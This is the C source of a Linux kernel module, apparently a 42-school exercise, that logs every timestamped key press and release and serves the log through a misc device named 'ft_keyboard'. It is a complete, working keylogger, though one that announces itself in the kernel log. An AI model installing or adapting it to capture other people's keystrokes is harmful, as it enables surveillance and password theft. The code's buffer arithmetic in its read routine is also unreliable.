#include <linux/fs.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/printk.h>
#include <linux/slab.h>
#include <linux/timekeeping.h>
#include <linux/time.h>
#include <linux/uaccess.h>

#include "ft_key.h"

extern const struct s_key keys_table[];

static LIST_HEAD(keystroke_list);
static DEFINE_SPINLOCK(log_spinlock);

static atomic_t	device_opened = ATOMIC_INIT(0);

#define MAX_KEYS_SUPPORTED 119

static int	dni_open(struct inode *inode, struct file *file)
{
	if (atomic_cmpxchg(&device_opened, 0, 1))
		return -EBUSY;
	return 0;
}

static int	dni_release(struct inode *inode, struct file *file)
{
	atomic_set(&device_opened, 0);
	return 0;
}

static ssize_t	dni_read(struct file *file, char __user *out, size_t len, loff_t *off)
{
	struct s_keystroke	*entry;
	char			*tmp_buf;
	size_t			total_size = 0;
	ssize_t			ret = 0;
	unsigned long		flags;

	tmp_buf = kmalloc(1024 * 64, GFP_KERNEL);
	if (!tmp_buf)
		return -ENOMEM;
	spin_lock_irqsave(&log_spinlock, flags);
	list_for_each_entry(entry, &keystroke_list, list) {
		int	n = snprintf(tmp_buf + total_size, 1024 * 64 - total_size,
				     "%02d:%02d:%02d %s (%lld), ascii code : \'%c\',  %s\n",
				     entry->tm.tm_hour, entry->tm.tm_min, entry->tm.tm_sec,
				     entry->key.name, entry->key.keycode,
				     entry->key.ascii ? entry->key.ascii : ' ',
				     entry->down ? "Pressed" : "Released");
		total_size += n;
	}
	spin_unlock_irqrestore(&log_spinlock, flags);
	if (*off >= total_size) {
		ret = 0;
		goto out;
	}
	if (len > total_size - *off)
		len = total_size - *off;
	if (copy_to_user(out, tmp_buf + *off, len)) {
		ret = -EFAULT;
		goto out;
	}
	*off += len;
	ret = len;
out:
	kfree(tmp_buf);
	return ret;
}

static const struct file_operations fops = {
	.owner = THIS_MODULE,
	.open = dni_open,
	.release = dni_release,
	.read = dni_read,
};

static struct miscdevice device = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "ft_keyboard",
	.fops = &fops,
};

static int	keyboard_event(struct notifier_block *nb, unsigned long action, void *data)
{
	struct keyboard_notifier_param	*param = data;
	struct timespec64		ts;
	struct s_keystroke		*stroke;
	unsigned long			flags;

	if (param->value > MAX_KEYS_SUPPORTED)
		return NOTIFY_OK;
	stroke = kmalloc(sizeof(struct s_keystroke), GFP_ATOMIC);
	if (!stroke || action != KBD_KEYCODE) {
		kfree(stroke);
		return NOTIFY_OK;
	}
	memcpy(&(stroke->key), &(keys_table[param->value]), sizeof(struct s_key));
	ktime_get_real_ts64(&ts);
	time64_to_tm(ts.tv_sec, 0, &(stroke->tm));
	stroke->down = param->down;
	spin_lock_irqsave(&log_spinlock, flags);
	list_add_tail(&stroke->list, &keystroke_list);
	spin_unlock_irqrestore(&log_spinlock, flags);
	return NOTIFY_OK;
}

static struct notifier_block	keyboard_nb = {
	.notifier_call = keyboard_event,
};

static int __init dni_init(void)
{
	int	ret;

	pr_info("hi from the 42 keylogger\n");
	ret = misc_register(&device);
	if (ret) {
		pr_err("Failed to register misc device\n");
		return ret;
	}
	ret = register_keyboard_notifier(&keyboard_nb);
	if (ret) {
		misc_deregister(&device);
		pr_err("Failed to register keyboard notifier\n");
		return ret;
	}
	return 0;
}

static void	cleanup_logs(void)
{
	struct s_keystroke	*cursor, *tmp;

	list_for_each_entry_safe(cursor, tmp, &keystroke_list, list) {
		list_del(&cursor->list);
		kfree(cursor);
	}
}

static void __exit dni_exit(void)
{
	struct s_keystroke	*cursor;

	misc_deregister(&device);
	unregister_keyboard_notifier(&keyboard_nb);
	list_for_each_entry(cursor, &keystroke_list, list) {
		pr_info("%02d:%02d:%02d %s (%llu), ascii : \'%c\', %s\n",
			cursor->tm.tm_hour, cursor->tm.tm_min, cursor->tm.tm_sec,
			cursor->key.name, cursor->key.keycode,
			cursor->key.ascii ? cursor->key.ascii : ' ',
			cursor->down ? "pressed" : "released");
	}
	cleanup_logs();
	pr_info("bye from the 42 keylogger\n");
}

module_init(dni_init);
module_exit(dni_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("a simple keylogger");
